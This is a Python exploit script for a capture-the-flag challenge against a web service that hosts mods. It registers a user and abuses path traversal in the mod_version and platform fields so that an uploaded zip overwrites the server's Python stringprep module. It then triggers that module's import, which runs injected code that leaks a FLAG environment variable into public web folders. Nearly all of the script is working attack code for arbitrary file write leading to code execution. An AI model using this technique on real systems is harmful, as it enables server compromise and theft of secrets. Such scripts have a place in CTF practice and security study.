#!/usr/bin/env python3
import requests, sys, io, zipfile, secrets, time, re

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://144.79.188.39:42166"
if not BASE.startswith("http"):
    BASE = "http://" + BASE

def fresh():
    u = "u" + secrets.token_hex(4)
    pw = "Pass12345!"
    requests.post(f"{BASE}/api/auth/register/", json={"username": u, "password": pw}, timeout=15)
    r = requests.post(f"{BASE}/api/auth/login/", json={"username": u, "password": pw}, timeout=15)
    return r.json()["access"], u

def H(tok):
    return {"Authorization": f"Bearer {tok}"}

def get_or_create_plat(tok, code, name="z"):
    r = requests.get(f"{BASE}/api/platforms/", headers=H(tok), timeout=15).json()
    for it in (r.get("results", r) if isinstance(r, dict) else r) or []:
        if isinstance(it, dict) and it.get("code") == code:
            return it["id"]
    rp = requests.post(f"{BASE}/api/platforms/", headers=H(tok),
        json={"code": code, "name": name}, timeout=15)
    return rp.json().get("id")

print(f"[*] Target: {BASE}")

OUT = "flag_" + secrets.token_hex(4) + ".txt"

# Original stringprep shim with RCE payload
SHIM = f"""import os as _os
try:
    with open('/usr/share/nginx/html/{OUT}', 'w') as _f:
        _f.write(_os.environ.get('FLAG', 'NOFLAG') + '\\n')
except Exception:
    pass
try:
    with open('/data/media/{OUT}', 'w') as _f:
        _f.write(_os.environ.get('FLAG', 'NOFLAG') + '\\n')
except Exception:
    pass
"""

print(f"[*] Target output: {OUT}")

# Step 1: Overwrite /usr/local/lib/python3.11/stringprep.py
# mod_version = '../../../usr/local' (18 chars)
# platform_code = 'lib/python3.11' (14 chars)
tok, u = fresh()
pid = get_or_create_plat(tok, "lib/python3.11")
mid = requests.post(f"{BASE}/api/mods/", headers=H(tok),
    json={"title":"z", "mod_version":"../../../usr/local", "release_notes":"", "is_enabled":True}, timeout=15).json()["id"]
bid = requests.post(f"{BASE}/api/mods/{mid}/builds/", headers=H(tok),
    json={"platform": pid}, timeout=15).json()["id"]

bio = io.BytesIO()
with zipfile.ZipFile(bio, 'w', zipfile.ZIP_DEFLATED) as zf:
    zf.writestr("stringprep.py", SHIM)
bio.seek(0)

r = requests.post(f"{BASE}/api/mods/{mid}/builds/{bid}/upload/", headers=H(tok),
    files={"zip_file": ("p.zip", bio, "application/zip")}, timeout=30)
print(f"[*] Overwrite stringprep.py status: {r.status_code}")

# Step 2: Trigger stringprep import
# Trigger via requests with unicode or idna host, or register with unicode username, or auth endpoints
print("[*] Triggering stringprep import...")
tok_t, _ = fresh()

# Try triggering via idna hostname normalization or auth
endpoints = [
    f"{BASE}/api/schema/",
    f"{BASE}/api/schema/?format=yaml",
    f"{BASE}/api/docs/",
    f"{BASE}/api/auth/me/",
    f"{BASE}/api/mods/",
]
for ep in endpoints:
    try:
        r_ep = requests.get(ep, headers=H(tok_t), timeout=10)
        print(f"  GET {ep} -> {r_ep.status_code}")
    except Exception as e:
        print(f"  ERR {ep}: {e}")

# Also trigger registration with international / unicode username
try:
    requests.post(f"{BASE}/api/auth/register/", json={"username": f"user_unicode_{secrets.token_hex(2)}", "password": "Password123!"}, timeout=10)
except Exception:
    pass

time.sleep(2)

# Step 3: Check for flag
print("\n[*] Checking flag...")
for url, label in [(f"{BASE}/{OUT}", "nginx /"), (f"{BASE}/media/{OUT}", "media /media/")]:
    rf = requests.get(url, timeout=10)
    print(f"  [{label}] status {rf.status_code}: {rf.text[:100] if rf.ok else ''}")
    m = re.search(r"PTITCTF\{[^}]+\}", rf.text)
    if m:
        print(f"\n==========================================")
        print(f">>> FLAG FOUND: {m.group(0)}")
        print(f"==========================================")
        sys.exit(0)
